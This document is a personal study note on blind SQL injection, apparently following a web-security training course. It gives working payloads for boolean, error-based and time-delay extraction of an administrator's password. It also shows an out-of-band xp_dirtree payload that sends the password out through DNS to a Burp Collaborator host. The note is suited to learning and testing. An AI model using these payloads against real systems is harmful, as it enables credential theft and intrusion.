## What is blind SQL injection ?
Blind SQL injection arises when an application is vulnerable to [[SQL Injection]], but its [[HTTP#Reponse]] does not contain the results of the relevant SQL query or the details of any database errors.
With blind SQL injection many tehniques such as [[UNION attacks]] are not effective because they rely on being able to see the results of the injected query.

## Exploiting blind SQL injection by triggering conditional responses
Consider an application that uses [[Cookies#Tracking]] to gather analytics. Requests to the application include a cookie header like this:
```txt
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
The application checks if a cookie is known by using an SQL query
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
This query is vulnerable to [[SQL Injection]] but the results are not returned to the user. However application does behave differently depending on whether the query returns any data. It displays a "Welcome back" message if the user supplies a valid cookie.
This behaviour is enough to be able to exploit the blind SQL injection.
```txt
...xyz' AND '1'='1
...xyz' AND '1'='2
```
With this we know we can check whether the query return true or false.

This can be used to construct an attack like the following
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm
```
We can know if this returned true or false so we know is the first letter of administrators's
password greater then m.
We can continue this attack and get the whole password.

## Inducing conditional responses
When the application carries out an SQL query but does not behave any differently, we can often induce the application to return conditional reponses by triggering SQL error condifionally.
```txt
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) = 'a
```
This method uses [[SQL#CASE]].
The first expression returns `True` and the second one returns `False`.

Using this technique we can craft a payload like this
```txt
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

## Triggering time delays
When the database handles errors gracefully, the preceding tehnique of inducing conditional errors will not work.
In this situation it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally.
```txt
'; IF (1=2) WAITFOR DELAY '0:0:10' -- 
'; IF (1=1) WAITFOR DELAY '0:0:10' -- 
```

With this technique wew can retrive data:
```txt
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
```
**Databases vary greatly on this topic so different techniques must be applied to different types of databases**

## Out-of-band techniques (OAST)
When the application does the query asynchronously none of the techniques described so dar will work.

In this situation is is often possible to exploit the injection by triggering out-of-band network interactions to a system that you control. This can be used to exfilitrate the data within the network interaction itself.

The typically used network protocol for this task is [[Domain Name System]]. This is because many production network allow free egress of DNS queries, because they are essential for the normal operation of production systems.

We can use [[Burp Collaborator]] to detect when network interaction occur.

On a Microsoft SQL Server paylaod would like something like this
```txt
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

You can then exfiltrate data with:
```txt
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

OAST techniques are extremely powerful way to detect and exploit blind SQL injection. For this reason OAST techniques are often preferable even in situation where other techniques for blind exploitation do work.